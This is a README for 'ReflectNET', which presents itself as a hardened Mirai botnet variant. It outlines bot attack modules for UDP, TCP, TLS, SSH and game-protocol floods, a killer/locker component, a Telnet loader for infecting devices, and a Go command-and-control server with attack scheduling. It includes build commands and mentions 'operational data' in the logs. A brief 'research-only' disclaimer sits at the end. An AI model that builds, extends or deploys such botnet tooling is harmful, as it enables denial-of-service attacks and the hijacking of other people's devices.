# ReflectNET

Hardened **Mirai variant**: ChaCha/TLS features, expanded L4/L7 and game-protocol attacks, `adding/` crypto/locker extensions, Go fleet CNC with manifest/API.

## Layout

```
ReflectNET/
├── bot/
│   ├── main.c
│   ├── attack_*.c      # UDP/TCP/TLS/SSH/MC/FiveM/...
│   ├── tls_bomb.c
│   ├── cnc.c           # Bot-side protocol client
│   └── adding/         # locker, domain table, encryption helpers
├── cnc/                # Go fleet manager
├── loader/src/         # Telnet loader
└── scanListen.go
```

## Bot highlights

- Mutual TLS / ChaCha-related paths in bot sources
- Application-layer methods beyond classic SYN/UDP floods
- Killer/locker in `adding/`

## CNC

```bash
cd cnc
go mod tidy && go build
```

Includes API, attack scheduling, bot manifest handling (see `cnc/*.go`).

## Loader

Build `loader/src` with project cross-toolchain; pair with `scanListen.go` for callback counting.

## Security hygiene

`logs/` may contain operational data—exclude from git.

## Disclaimer

Research-only. Do not run against public networks.
